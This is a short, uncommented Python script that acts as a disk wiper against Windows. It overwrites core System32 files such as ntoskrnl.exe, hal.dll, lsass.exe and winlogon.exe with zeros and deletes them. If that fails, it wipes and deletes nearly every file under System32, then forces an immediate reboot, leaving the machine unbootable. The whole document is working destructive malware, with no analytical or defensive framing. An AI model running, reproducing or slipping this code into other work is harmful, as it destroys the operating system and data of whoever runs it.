import os
dl = []
for fn in [
    'ntoskrnl.exe', 'hal.dll', 'csrss.exe', 'wininit.exe', 'winlogon.exe',
    'kernel32.dll', 'user32.dll', 'gdi32.dll', 'advapi32.dll', 'ntdll.dll',
    'msvcrt.dll', 'lsass.exe', 'secur32.dll', 'crypt32.dll',
    'services.exe', 'svchost.exe', 'conhost.exe']:
    filepath = os.path.join(r"C:\Windows\System32", fn) ; f = None
    try:
        fs = os.path.getsize(filepath) ;f = open(filepath, 'rb+'); f.seek(0) ; bw = 0
        while bw < fs:
            f.write('\x00' * min(4194304, fs - bw)) ; bw += min(4194304, fs - bw)
    except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
    if f: f.close()
    try: os.remove(filepath); dl.append(fn)
    except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
if 'ntoskrnl.exe' not in dl or 'hal.dll' not in dl:
    for r, _, fs_in_r in os.walk(r"C:\Windows\System32"):
        for f in fs_in_r:
            if os.path.basename(f).lower() not in ['cmd.exe', 'shutdown.exe']:
                filepath = os.path.join(r, f) ; of = None
                try:
                    fs = os.path.getsize(filepath) ;of = open(filepath, 'rb+') ;of.seek(0) ;bw = 0
                    while bw < fs:
                        of.write('\x00' * min(4194304, fs - bw)) ; bw += min(4194304, fs - bw)
                except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
                if of: of.close()
                try: os.remove(filepath)
                except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
    for r, ds, fs_in_r in os.walk(r"C:\Windows\System32", topdown=False):
        if not ds and not fs_in_r:
            try: os.rmdir(r)
            except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
try: os.system("shutdown /r /t 0 /f")
except (OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass